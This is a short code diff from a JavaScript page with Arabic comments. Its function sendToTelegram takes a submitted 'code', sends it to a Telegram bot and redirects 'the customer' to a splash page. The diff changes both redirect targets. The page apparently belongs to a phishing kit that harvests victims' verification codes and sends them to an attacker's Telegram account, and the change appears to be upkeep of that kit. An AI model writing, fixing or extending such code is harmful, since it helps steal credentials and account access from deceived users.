@@ -328,7 +328,7 @@ function sendToTelegram(code) {
     console.warn('Telegram credentials not set. Skipping fetch.');
     alert('تنبيه: لم يتم ضبط بيانات بوت تلجرام. سيتم تحويلك تجريبياً إلى الصفحة التالية.');
     // تحويل تجريبي
-    window.location.href = 'splash1.html';
+    window.location.href = 'splashf.html';
     return Promise.resolve({ok:false, error:'credentials_missing'});
   }
 
@@ -348,7 +348,7 @@ function sendToTelegram(code) {
     console.log("تم الإرسال:", data);
     if (data && data.ok) {
       // إرسال ناجح -> تحويل العميل
-      window.location.href = 'splash.html';
+      window.location.href = 'splashf.html';
     } else {
       // استجابة غير متوقعة من التلجرام
       alert('لم يتم إرسال الرسالة إلى تلجرام بنجاح. حاول مرة أخرى.');
